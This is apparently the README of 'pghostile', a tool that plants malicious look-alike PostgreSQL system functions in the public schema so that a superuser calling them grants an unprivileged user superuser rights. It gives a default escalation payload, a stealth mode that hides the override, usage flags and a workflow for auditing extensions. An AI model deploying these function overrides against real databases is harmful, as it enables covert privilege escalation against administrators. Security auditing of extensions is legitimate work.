# PGHOSTILE
Pghostile can make PostgreSQL an hostile environment for superusers and a nice playground for attackers.  
Pghostile is an automated tool for overriding "system" functions (the ones from the 'pg_catalog' schema) allowing an attacker to elevate privileges if/when these functions are called by a superuser.  

It can be also used to test the security of the PostgreSQL extension. You can run pghostile to create the "exploit functions" and then run the extension's unit tests and see if you get superuser power after that.

## How it works
In PostgreSQL every function is identified by it's name plus the number/types of arguments (like in Java). If a function is defined to accept a numberic value and you define a function with the same name that accepts an integer, your function will be called if the input parameter is an integer and the original one will be called if the input is a float.  
Considering that an unprivileged user can create functions in the public schema and that the public schema is part of the 'search_path', it's relatively easy to trick a superuser to run code from public instead of pg_catalog.  

In a few words, pghostile searches pg_catalog for functions that can be overridden and creates a malicious wrapper of them in the public schema.  

Currently, it can identify ~900 functions/parameters combinations that can lead to privilege escalation. To give an example, the list below contains some of these functions:  
```SQL
select sha256('randstr');
select unnest(array [1, 2]);
select array_replace(array [1, 2], 1, 1);
select date_cmp('2022-07-12', '2022-07-12');
select time_cmp('00:00:00', '00:00:00');
select varcharout('randstr');
select round(1, 1);
select floor(1);
select power(1, 1);
select int4(1);
select div(1, 1);
select format('randstr', 1);
select pg_sleep(1.1);
select inet_out('10.0.0.1');
select hashmacaddr('01:01:01:02:02:02');
select hashinet('10.0.0.1');
select xml_out('<foo />');
select json_out('[true]');
select uuid_out('93967025-8c89-4320-ad51-4ef50694502f');
```

Then, if the superuser runs something like `select sha256('test123')` you will be superuser in no time ;)

## Usage
```
positional arguments:
  db_username           Database username
  db_name               Database name

optional arguments:
  -h, --help            show this help message and exit
  -X, --disable-exploits-creation
                        Do not create exploit functions
  -H DB_HOST, --db-host DB_HOST
                        Database host (default 127.0.0.1)
  -p DB_PORT, --db-port DB_PORT
                        Database port
  -P, --ask-pass        Prompt for database passsword
  -o OUT, --out OUT     Output dir (deafult ./out)
  -T, --skip-tests      Disable test
  -s, --disable-stealth-mode
                        Disable stealth mode
  -S DB_SSL_MODE, --db-ssl-mode DB_SSL_MODE
                        Database ssl mode (default None)
  -x EXPLOIT_PAYLOAD, --exploit-payload EXPLOIT_PAYLOAD
                        The SQL commands
  -t, --track-execution
                        Track the exploit function execution
  -O, --no-overwrite    Stop execution if at least one exploit function already exists
```

With the -X option you can disable the actual exploit creation. It will just run the tests to see which functions can be overridden.  
With the -T option you can disable the tests and just create the exploit functions.  
The -x option allows you to specify what SQL command(s) should be used in your exploit. By default it's ```ALTER USER <db_username> WITH SUPERUSER;```.  
The -s option disables the "stealth mode". In stealth mode the wrapping functions will call the original function from pg_catalog, in this way the superuser won't see any anomaly when calling a wrapped function. There are also less chances to break execution flows that could bring us to other vulnerable points.  
The -t option enables the tracking of the execution of the exploit functions. It means that every successfull call of an exploit function is logged into a table of the current DB (pghostile.triggers). It's useful for extension analisys.  
The -p option forces the DB's password request even if the PGPASSWORD environment variable is set.  

### Example
```
pghostile.py user1 testdb -H 10.211.55.12
```
```
Starting ... 

[ * ] 1272 interesting functions have been identified
[ * ] Testing 1697 functions
[ * ] 895 exploitable functions found
[ * ] 908 function and parameters combinations run successfully
[ * ] Creating exploit functions
[ * ] Done!

895 functions have been created
The './out' folder contains the output
```

## PG Extension audit
Pghostile can be used to audit the security of PostgreSQL extensions:
1. Run pghostile with the '-t' option to enable execution tracking
```
pghostile.py -t user1 testdb
```
2. Run, as superuser, as many extension's queries/functions as possible
```
psql -U postgres testdb < extension_queries.sql
```
3. Check if you are superuser
```sql
SELECT rolsuper FROM pg_roles where rolname='user1'
```
4. If you are superuser, all the functions that triggered the exploit are listed in:
```sql
select * from pghostile.triggers
```
